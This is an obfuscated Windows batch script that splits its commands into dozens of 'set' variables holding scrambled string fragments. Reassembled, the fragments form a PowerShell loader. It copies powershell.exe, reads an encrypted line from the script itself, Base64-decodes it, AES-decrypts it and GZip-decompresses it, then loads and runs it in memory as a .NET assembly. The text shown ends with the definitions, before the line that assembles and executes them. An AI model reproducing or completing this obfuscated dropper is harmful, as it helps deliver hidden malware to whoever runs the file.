@echo off
set "aRatOwixzZ=ll"
set "rUpPWuxIgv= C"
set "nKlKiKOUte=in"
set "xbiOinWhQT=ws"
set "ytvZSlLFve=0\"
set "xpqikCrTVr=Wi"
set "PblXzTipxC=we"
set "BAufgZrdNo=do"
set "NYBsBmRaSb= /"
set "dRtGxrkGUw=rs"
set "dvhTaKGFiR=.e"
set "kXqaplBwBU=rS"
set "cTBwnorYdc=ow"
set "NvwplACIRD=co"
set "TbarhWAURN=py"
set "XFrSvdfkNf=he"
set "jMgVtBxxSK=y "
set "dENPLhBuCv=Sy"
set "ZtdANDOTVV=st"
set "KjcpzSgHtQ=nd"
set "VdDbqbEgFt=s\"
set "LFFNIIkMWX=\v"
set "CZmFjicqRP=po"
set "lsPTvGFbZx=em"
set "YvwuRkKsCw=xe"
set "crQWnciSiD=1."
set "OHdAyaOiVC=he"
set "oZcZMygMLg=32"
set "JlsGEmCqBd=we"
set "lZlLElJBkV=ll"
set "GBMmjEOsRb=Po"
set "MXvIcCadoM=\W"
set "qEKbofawqP=:\"
set "ocdXioEuXI=cd"
set "hzQnsmQMIe= %~dp0"
set "VQydiNXDIa=);$l"
set "VBUrbUKPfq=uG.T"
set "nyjsjreiei=ZYhM"
set "IZbVCHcZEl=Disp"
set "kGWjfNDeyB=  $j"
set "ktawsmiLeD=Invo"
set "YXPhoZZBxj=ocyX"
set "SKmWBoHAJK=e = "
set "WTSlYKyagv=;$Er"
set "YdJSzxApQn=ose("
set "jdbeTtIrMc=[Sys"
set "qkicXPKGaS=..-1"
set "cARXvkvWzT=.Cre"
set "WRsbpSDdPg=ect "
set "caWZUHcIBS=t Sy"
set "QwMOBjLqWM=$BxM"
set "HezCrAcJBj=();$"
set "NLYXWTITfc=.Mod"
set "zRAwSMmenl=pose"
set "pkPMIOpRHk=onve"
set "SETfbArrgm=[Env"
set "aMEbOiCiFv=ert]"
set "SsoDshKGqt=Erld"
set "mpiYBIymCP=ocyX"
set "iyvWCFwSOB=bjec"
set "uDzfUFJkyh=ress"
set "XqUDzKrJej=null"
set "mDRGkPjfLX=vj0m"
set "HIPTqNbMHo=$BxM"
set "eLomdVJQbS=join"
set "xCjcYSWwoP=ne);"
set "BAmPLBbmRS=('%~f0'"
set "KjoCfqtLIi=.Key"
set "hcueksJAQJ=th('"
set "utWBxaaEhR=O.Me"
set "RGANfwCaJv=$MJM"
set "dEqBrecNmh=NSb."
set "ScjHuGtVXM=Cp);"
set "lcFpBnADOd=]::C"
set "iaNfivlEhm=StJ."
set "VvKwNFNdqh=orF'"
set "bDBQlGJsJF=$pcc"
set "CHSzUnweRW=PKCS"
set "QYelvCMGCh=);$B"
set "BdTBTHFwVq=sion"
set "irIWHjIXUS=OyzA"
set "mWXAbWfNKB=.-16"
set "SpAtngOGQe=[IO."
set "lTIxEmIeGT=esaB"
set "wVpnNyEYZC=1] -"
set "pMZqLhmQvj=ose("
set "vWNFsrIQts=MuG "
set "vWqSusTSPP=Mode"
set "vqbxbYgVgR=UdQ."
set "lUOKBXEapi=$tnx"
set "RADcaAADnG=vert"
set "UWCeRpKHDy=flec"
set "FBIOYPqybf=yste"
set "ktBqwbMiQU=3HWs"
set "FIJEMaKnKF=UGTu"
set "JJliUUzwWH=ring"
set "VaicXEBUnF=rt]:"
set "tvXNayAsnO=PxpQ"
set "JLyuTDitfR=; };"
set "nkvLGsuSUl=tem."
set "aQyyGLtSrY=m(, "
set "jsTvypvyTc=A.Pa"
set "DrGkmcwIli=::('"
set "hnoQnTjtyJ=Cp.T"
set "SQKJzoNerX=comm"
set "wZTuHXJvWG=.Ass"
set "HQzQfWlXWI=ptog"
set "ZoUQaLyGux=]::N"
set "BEHPZyzWko=dUdQ"
set "HedPuFWWYc=v4Ir"
set "WPIjGoXYvs=J.Su"
set "daZJSZpBZE=New-"
set "zNLVmoXaFy=Stre"
set "bfItoAxpwm=Syst"
set "OFInJLjTWW=.IO."
set "TeowmbTTgk=:('g"
set "PrEHEMfOOa=stem"
set "jmOyRQWUyX=-1.."
set "JAVaEiYBRm=);$p"
set "AUmtwAXqGU=tryP"
set "LdxkKqBwcX=-4] "
set "ToEApApppt=Cp ="
set "ODLZxhMgPd=bstr"
set "XdYfviJfZv=('l0"
set "NzOjLOYqhx=.Con"
set "JlfbDdeRCN=le  "
set "HjwrRGVfvv=-joi"
set "HaPXceIVUD=-joi"
set "nRwAYoQvzH=ress"
set "urBuNpOBGd=rtS4"
set "fodiEIIrlM=rans"
set "pIqhTZXQbw=tnxh"
set "psMvYFJHsH=).Sp"
set "RsFxJSmtSp= New"
set "LSoSWbGRvt=esFX"
set "bCjzBrPhrm=m.IO"
set "NkPXLnDhZs=ck($"
set "DppSVrGYTA=Conv"
set "biUGmCSdZV=F'[-"
set "oJEhikjuyS=QX ="
set "FiOpnqEZQj=.Dis"
set "OTFQJyCHwc=;$ld"
set "NVjAppkFIY=tsWi"
set "AasOnqjeiG='dqR"
set "JHGLNOflQQ=$tzN"
set "eEUZzkglcp=ptog"
set "WvvBPGVGfk=y.Cr"
set "QajmLXAiwe=$Pxp"
set "UapvJDDrjx=lBlo"
set "RcvqrCfVtN=-Obj"
set "HcwBdNsQxQ=.GZi"
set "SmscqKVPAZ=pose"
set "PbsFnIsbUA=StJ "
set "ZyuMydhKVP=Comp"
set "gTEiYFczCh=7Yiv"
set "nZEgbLzAzB=ach "
set "jXyfuzPpVB=pStr"
set "OTnitZykvR='')("
set "TXweEOUlyK=] -j"
set "bGlwfnzAAk=yste"
set "udaQrwsVGQ=trea"
set "QBVlHewgPd=.Cry"
set "HPyPwvELqE=New-"
set "kOVxHxjNOf=ct S"
set "dZHwQmqLsH=ment"
set "vUhPxaEvJr=.Mem"
set "KFYNobEruA=m.Re"
set "gPZMfsdMgi=rofi"
set "GNIcjJoAqy=File"
set "egcLjYKKyr=brea"
set "VYMKRHJZXn=morF"
set "vfJcTiYZfb=.Len"
set "fQtEKlhjTn=, $t"
set "AcCbWYlvAr=ecry"
